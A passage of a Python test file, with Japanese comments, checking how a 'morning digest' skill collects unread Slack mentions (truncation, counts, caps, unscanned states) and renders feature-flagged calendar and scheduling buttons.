        )
    )
    it = MorningDigestSkill(slack=prov)._collect_slack_unread(ME, MorningDigestInput(), _ctx())[0][
        0
    ]
    assert it.channel_id == "D9"
    assert it.channel_kind == "dm"
    assert it.from_user_id == "U_BOSS"
    assert it.from_display_name == "山田 太郎"
    assert it.thread_message_count == 3
    assert it.thread_participant_ids == ["U_BOSS", "U_OTHER2"]
    assert it.thread_last_user_id == "U_OTHER2"
    assert it.thread_last_at == "2026-07-10T10:00:00+09:00"
    assert it.answered_by_other is True
    assert it.sender_followed_up is True
    assert it.mentioned_user_ids == ["U_ME", "U_OTHER2"]


def test_skill_keeps_display_name_none_when_unresolved() -> None:
    """実名が引けなかったら None のまま（架空の名前を作らない・空欄と明示）。"""
    prov = _Prov(
        UnrepliedCollection(items=(_mention(user="U_X", user_display=None),), total_unreplied=1)
    )
    it = MorningDigestSkill(slack=prov)._collect_slack_unread(ME, MorningDigestInput(), _ctx())[0][
        0
    ]
    assert it.from_user_id == "U_X"
    assert it.from_display_name is None


def test_skill_preserves_body_up_to_1500_chars() -> None:
    """本文は 1500 字まで保持される（schema の max_length と skill の切詰が同値）。

    ⚠️ 変異テスト用の要: schema.py の max_length だけ 200 に戻すと
    pydantic ValidationError になり、この test は赤になる。
    """
    body = "あ" * 1600
    prov = _Prov(UnrepliedCollection(items=(_mention(text=body),), total_unreplied=1))
    it = MorningDigestSkill(slack=prov)._collect_slack_unread(ME, MorningDigestInput(), _ctx())[0][
        0
    ]
    assert len(it.excerpt_display) == 1500
    assert it.excerpt_display == body[:1500]
    # ログ・監査用のマスク側は従来どおり短いまま（DLP 面を勝手に広げない）。
    assert len(it.excerpt_scrubbed) <= 120


def test_skill_reports_total_and_truncation_separately_from_shown() -> None:
    """表示 5 件と母数は別物。打ち切りフラグもそのまま持ち帰る。"""
    prov = _Prov(
        UnrepliedCollection(
            items=tuple(_mention(ts=f"{1000 + i}.1") for i in range(5)),
            total_unreplied=9,
            scan_truncated=True,
        )
    )
    items, total, truncated, _scanned = MorningDigestSkill(slack=prov)._collect_slack_unread(
        ME, MorningDigestInput(), _ctx()
    )
    assert len(items) == 5
    assert total == 9  # len(items) と一致しない＝母数
    assert truncated is True


def test_skill_returns_empty_when_provider_none() -> None:
    """機能フラグ OFF / 未配線は「0 件」ではなく **走査していない**（scanned=False）。"""
    skill = MorningDigestSkill(slack=None)
    assert skill._collect_slack_unread(ME, MorningDigestInput(), _ctx()) == ([], 0, False, False)


def test_skill_marks_fail_open_provider_result_as_unscanned() -> None:
    """provider の fail-open（空 + scanned=False）を「0 件」と言い換えない。"""
    prov = _Prov(UnrepliedCollection())  # 未連携・scope 不足・API 失敗はすべてこの形
    items, total, truncated, scanned = MorningDigestSkill(slack=prov)._collect_slack_unread(
        ME, MorningDigestInput(), _ctx()
    )
    assert (items, total, truncated, scanned) == ([], 0, False, False)


def test_skill_passes_all_candidates_to_the_judgement_layer() -> None:
    """表示 5 件で間引かない（間引くと 6 件目以降の「あなたの番」が永久に出ない）。"""
    prov = _Prov(
        UnrepliedCollection(
            items=tuple(_mention(ts=f"{1000 + i}.1") for i in range(9)),
            total_unreplied=9,
            scanned=True,
        )
    )
    items, total, _truncated, _scanned = MorningDigestSkill(slack=prov)._collect_slack_unread(
        ME, MorningDigestInput(), _ctx()
    )
    assert len(items) == 9 and total == 9


def test_skill_caps_what_it_hands_downstream() -> None:
    """下流（判定層・生 ID 掃除）は全件を舐めるので、受け取り側にも明示の上限を置く。

    provider 側は max_thread_checks で構造的に有界だが、その前提が緩んだ日に
    朝の Fargate タスクへ無制限の CPU が乗らないようにする歯止め。
    """
    prov = _Prov(
        UnrepliedCollection(
            items=tuple(_mention(ts=f"{1000 + i}.1") for i in range(60)),
            total_unreplied=60,
            scanned=True,
        )
    )
    items, total, _truncated, _scanned = MorningDigestSkill(slack=prov)._collect_slack_unread(
        ME, MorningDigestInput(), _ctx()
    )
    assert len(items) == 25  # _SLACK_UNREAD_MAX_ITEMS
    assert total == 60  # 母数は削らない（見出しの「N件」は事実のまま）


# ── v0.3 Task3: 📅 カレンダー登録ボタンの描画（flag 既定OFF） ────────────────


def _meeting_item(**kw: Any) -> Any:
    from teamagent.skills.morning_digest.schema import MailDigestItem

    return MailDigestItem(
        counterpart_masked="a***@x",
        importance="high",
        to_self=True,
        subject_display="7/15 定例の件",
        draft_token="DTOK",
        meeting_start="2026-07-15T14:00:00+09:00",
        meeting_end="2026-07-15T15:00:00+09:00",
        meeting_title="◯◯様 定例",
        event_token=kw.get("event_token", "ETOK"),
    )


def test_calendar_button_rendered_when_flag_on(monkeypatch: Any) -> None:
    monkeypatch.setenv("MORNING_DIGEST_CALENDAR_BUTTON", "1")
    btns = runner._reply_buttons(_meeting_item())
    cal = [b for b in btns if b.get("action_id") == "calendar_event"]
    assert cal and cal[0]["value"] == "ETOK"


def test_calendar_button_absent_when_flag_off(monkeypatch: Any) -> None:
    monkeypatch.delenv("MORNING_DIGEST_CALENDAR_BUTTON", raising=False)
    btns = runner._reply_buttons(_meeting_item())
    assert not [b for b in btns if b.get("action_id") == "calendar_event"]


def test_calendar_button_absent_without_token(monkeypatch: Any) -> None:
    # 日時未確定/To 本人でない → event_token 空 → flag ON でもボタン無し。
    monkeypatch.setenv("MORNING_DIGEST_CALENDAR_BUTTON", "1")
    btns = runner._reply_buttons(_meeting_item(event_token=""))
    assert not [b for b in btns if b.get("action_id") == "calendar_event"]


# ── v0.3 Task4: 🗓 日程候補を提案ボタンの描画（flag 既定OFF） ────────────────


def test_schedule_button_rendered_when_flag_on(monkeypatch: Any) -> None:
    from teamagent.skills.morning_digest.schema import MailDigestItem

    monkeypatch.setenv("MORNING_DIGEST_SCHEDULE_BUTTON", "1")
    m = MailDigestItem(
        counterpart_masked="a***@x",
        importance="high",
        to_self=True,
        draft_token="DTOK",
        scheduling_request=True,
    )
    btns = runner._reply_buttons(m)
    sched = [b for b in btns if b.get("action_id") == "schedule_propose"]
    assert sched and sched[0]["value"] == "DTOK"  # draft_token を流用（thread_id 由来）

    # flag OFF なら出ない。
    monkeypatch.delenv("MORNING_DIGEST_SCHEDULE_BUTTON", raising=False)
    assert not [b for b in runner._reply_buttons(m) if b.get("action_id") == "schedule_propose"]

    # scheduling_request=False なら flag ON でも出ない。
    monkeypatch.setenv("MORNING_DIGEST_SCHEDULE_BUTTON", "1")
    m2 = MailDigestItem(
        counterpart_masked="a***@x", importance="high", to_self=True, draft_token="DTOK"
    )
    assert not [b for b in runner._reply_buttons(m2) if b.get("action_id") == "schedule_propose"]
